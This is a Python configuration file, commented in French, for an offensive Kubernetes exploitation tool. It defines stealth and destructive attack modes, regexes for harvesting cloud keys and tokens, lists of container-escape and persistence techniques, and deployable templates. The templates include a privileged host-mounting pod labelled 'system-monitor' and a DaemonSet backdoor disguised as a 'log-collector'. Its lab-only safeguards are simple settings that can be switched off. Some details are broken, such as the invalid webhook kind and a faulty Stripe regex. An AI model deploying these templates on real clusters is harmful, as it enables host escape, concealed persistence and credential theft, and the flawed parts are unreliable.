#!/usr/bin/env python3
"""
WWYVQV5 - Configuration avancée pour l'exploitation Kubernetes
"""

from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional

# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 CONFIGURATION COMPLÈTE D'EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class K8sExploitationConfig:
    """Configuration complète pour l'exploitation Kubernetes"""
    
    # === MODES D'EXPLOITATION ===
    MODES = {
        "passive": {
            "deploy_pods": False,
            "command_execution": False,
            "modify_rbac": False,
            "create_persistence": False,
            "lateral_movement": False,
            "data_exfiltration": False
        },
        "active": {
            "deploy_pods": True,
            "command_execution": True,
            "modify_rbac": False,
            "create_persistence": False,
            "lateral_movement": False,
            "data_exfiltration": False
        },
        "aggressive": {
            "deploy_pods": True,
            "command_execution": True,
            "modify_rbac": True,
            "create_persistence": True,
            "lateral_movement": True,
            "data_exfiltration": False  # Sécurité: pas d'exfiltration par défaut
        },
        "stealth": {
            "deploy_pods": True,
            "command_execution": True,
            "modify_rbac": False,
            "create_persistence": True,
            "lateral_movement": True,
            "data_exfiltration": False,
            "cleanup_traces": True,
            "randomize_timing": True
        },
        "destructive": {  # LAB UNIQUEMENT
            "deploy_pods": True,
            "command_execution": True,
            "modify_rbac": True,
            "create_persistence": True,
            "lateral_movement": True,
            "data_exfiltration": True,
            "destructive_tests": True,
            "require_lab_confirmation": True
        }
    }
    
    # === LIMITES DE SÉCURITÉ ===
    LIMITS = {
        "max_pods_per_cluster": 5,
        "max_concurrent_clusters": 10,
        "max_secrets_to_extract": 1000,
        "timeout_per_operation": 30,
        "max_exploitation_time": 3600,  # 1 heure max
        "max_persistence_mechanisms": 3,
        "rate_limit_delay": 1.0  # Délai entre requêtes
    }
    
    # === PERSISTENCE ===
    PERSISTENCE = {
        "cleanup_on_exit": True,
        "maintain_access": False,  # Sécurité: pas de maintien par défaut
        "stealth_mode": False,
        "backup_access_methods": 2,
        "persistence_check_interval": 300  # 5 minutes
    }
    
    # === ALERTES ET NOTIFICATIONS ===
    ALERTS = {
        "telegram_enabled": False,
        "discord_enabled": False,
        "slack_enabled": False,
        "email_enabled": False,
        "webhook_url": None,
        "alert_on_compromise": True,
        "alert_on_high_value": True,
        "alert_on_persistence": True
    }
    
    # === EXPORT ET RAPPORTS ===
    EXPORTS = {
        "json_detailed": True,
        "csv_credentials": True,
        "html_dashboard": True,
        "pdf_report": False,
        "excel_analysis": False,
        "compress_output": True,
        "encrypt_sensitive": False
    }
    
    # === PATTERNS DE DÉTECTION ===
    SENSITIVE_PATTERNS = {
        'aws_access_key': r'AKIA[0-9A-Z]{16}',
        'aws_secret_key': r'[0-9a-zA-Z/+=]{40}',
        'aws_session_token': r'[A-Za-z0-9/+=]{100,}',
        'gcp_service_account': r'"type":\s*"service_account"',
        'gcp_api_key': r'AIza[0-9A-Za-z_-]{35}',
        'azure_client_secret': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
        'azure_storage_key': r'[A-Za-z0-9+/]{86}==',
        'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
        'private_key_rsa': r'-----BEGIN RSA PRIVATE KEY-----',
        'private_key_ec': r'-----BEGIN EC PRIVATE KEY-----',
        'private_key_openssh': r'-----BEGIN OPENSSH PRIVATE KEY-----',
        'api_key_generic': r'[Aa][Pp][Ii]_?[Kk][Ee][Yy].*[0-9a-f]{32,64}',
        'password_generic': r'[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd].*[=:]\s*[^\s]+',
        'database_url': r'(mysql|postgresql|mongodb|redis)://[^\s]+',
        'docker_auth': r'"auth":\s*"[A-Za-z0-9+/=]+"',
        'kubernetes_token': r'[A-Za-z0-9_-]{40,}',
        'github_token': r'gh[pousr]_[A-Za-z0-9_]{36}',
        'gitlab_token': r'glpat-[A-Za-z0-9_-]{20}',
        'slack_token': r'xox[baprs]-[A-Za-z0-9-]+',
        'stripe_key': r'sk_[live|test]_[A-Za-z0-9]{24}',
        'mailgun_key': r'key-[A-Za-z0-9]{32}',
        'twilio_sid': r'AC[A-Za-z0-9]{32}',
        'sendgrid_key': r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'
    }
    
    # === IMAGES MALVEILLANTES RECOMMANDÉES ===
    MALICIOUS_IMAGES = [
        "alpine:latest",
        "busybox:latest",
        "ubuntu:latest",
        "debian:latest",
        "centos:latest",
        "nginx:alpine",
        "python:3.9-alpine",
        "node:alpine",
        "golang:alpine"
    ]
    
    # === TECHNIQUES D'ÉVASION ===
    CONTAINER_ESCAPE_TECHNIQUES = [
        "docker_socket_mount",      # Montage de /var/run/docker.sock
        "host_filesystem_mount",    # Montage de /
        "privileged_container",     # Conteneur privilégié
        "host_network_namespace",   # Namespace réseau hôte
        "host_pid_namespace",       # Namespace PID hôte
        "proc_mount_escape",        # Évasion via /proc/1/root
        "cgroup_release_agent",     # Exploitation cgroup release_agent
        "sys_admin_capability",     # Capability SYS_ADMIN
        "sys_ptrace_capability",    # Capability SYS_PTRACE
        "dac_override_capability"   # Capability DAC_OVERRIDE
    ]
    
    # === MÉCANISMES DE PERSISTANCE ===
    PERSISTENCE_MECHANISMS = [
        "malicious_daemonset",           # DaemonSet sur tous les nœuds
        "webhook_admission_controller",   # Webhook d'admission
        "cronjob_backdoor",              # CronJob récurrent
        "mutating_webhook",              # Webhook mutant
        "validating_webhook",            # Webhook validant
        "custom_resource_definitions",   # CRDs malveillantes
        "rbac_modification",             # Modification des RBAC
        "service_account_creation",      # Service accounts privilégiés
        "secret_injection",              # Injection de secrets
        "configmap_poisoning",           # Empoisonnement ConfigMaps
        "operator_deployment",           # Opérateurs malveillants
        "init_container_backdoor",       # Init containers backdoor
        "sidecar_injection"              # Injection de sidecars
    ]
    
    # === ENDPOINTS KUBERNETES À TESTER ===
    K8S_ENDPOINTS = [
        # API Server
        "/api/v1",
        "/apis",
        "/version",
        "/healthz",
        "/metrics",
        
        # Secrets et ConfigMaps
        "/api/v1/secrets",
        "/api/v1/configmaps",
        "/api/v1/namespaces/{namespace}/secrets",
        "/api/v1/namespaces/{namespace}/configmaps",
        
        # Service Accounts et RBAC
        "/api/v1/serviceaccounts",
        "/apis/rbac.authorization.k8s.io/v1/roles",
        "/apis/rbac.authorization.k8s.io/v1/rolebindings",
        "/apis/rbac.authorization.k8s.io/v1/clusterroles",
        "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
        
        # Workloads
        "/api/v1/pods",
        "/apis/apps/v1/deployments",
        "/apis/apps/v1/daemonsets",
        "/apis/batch/v1/jobs",
        "/apis/batch/v1/cronjobs",
        
        # Networking
        "/api/v1/services",
        "/apis/networking.k8s.io/v1/networkpolicies",
        "/apis/networking.k8s.io/v1/ingresses",
        
        # Storage
        "/api/v1/persistentvolumes",
        "/api/v1/persistentvolumeclaims",
        "/apis/storage.k8s.io/v1/storageclasses",
        
        # Admission Controllers
        "/apis/admissionregistration.k8s.io/v1/mutatingadmissionwebhooks",
        "/apis/admissionregistration.k8s.io/v1/validatingadmissionwebhooks",
        
        # Custom Resources
        "/apis/apiextensions.k8s.io/v1/customresourcedefinitions"
    ]
    
    # === PORTS KUBERNETES STANDARDS ===
    K8S_PORTS = {
        6443: "API Server (HTTPS)",
        8080: "API Server (HTTP) - INSECURE",
        8443: "API Server alternatif",
        10250: "Kubelet API",
        10255: "Kubelet (read-only) - DEPRECATED",
        10256: "Kube-proxy health",
        2379: "etcd client",
        2380: "etcd peer",
        30000: "NodePort range start",
        32767: "NodePort range end"
    }
    
    # === VALIDATION DE SÉCURITÉ ===
    SECURITY_VALIDATION = {
        "require_lab_confirmation": True,
        "block_production_domains": [
            "amazonaws.com", "azure.com", "googleapis.com",
            "digitalocean.com", "linode.com", "vultr.com"
        ],
        "allowed_lab_indicators": [
            "localhost", "127.0.0.1", "10.", "172.16.", "172.17.",
            "172.18.", "192.168.", "kind", "minikube", "k3s",
            "test", "lab", "dev", "staging"
        ],
        "max_exploitation_duration": 7200,  # 2 heures max
        "auto_cleanup_timeout": 1800,       # Nettoyage auto après 30min
        "require_explicit_destructive": True
    }


# === TEMPLATES POUR PAYLOADS ===

PRIVILEGED_POD_TEMPLATE = """
apiVersion: v1
kind: Pod
metadata:
  name: {name}
  namespace: {namespace}
  labels:
    app: system-monitor
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: monitor
    image: {image}
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
      capabilities:
        add: ["SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE"]
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: host-root
    hostPath:
      path: /
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
"""

DAEMONSET_BACKDOOR_TEMPLATE = """
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: {name}
  namespace: {namespace}
spec:
  selector:
    matchLabels:
      app: log-collector
  template:
    metadata:
      labels:
        app: log-collector
    spec:
      hostNetwork: true
      containers:
      - name: collector
        image: {image}
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 3600; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-logs
          mountPath: /var/log/host
          readOnly: true
        - name: host-root
          mountPath: /host
          readOnly: false
      volumes:
      - name: host-logs
        hostPath:
          path: /var/log
      - name: host-root
        hostPath:
          path: /
"""

CRONJOB_PERSISTENCE_TEMPLATE = """
apiVersion: batch/v1
kind: CronJob
metadata:
  name: {name}
  namespace: {namespace}
spec:
  schedule: "*/30 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: maintenance
            image: {image}
            command: ["/bin/sh"]
            args: ["-c", "echo 'Maintenance completed' && sleep 60"]
          restartPolicy: OnFailure
"""

WEBHOOK_BACKDOOR_TEMPLATE = """
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingAdmissionWebhook
metadata:
  name: {name}
webhooks:
- name: pod-security.example.com
  clientConfig:
    service:
      name: webhook-service
      namespace: kube-system
      path: /mutate
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1", "v1beta1"]
"""

# Export de la configuration
K8S_CONFIG = K8sExploitationConfig()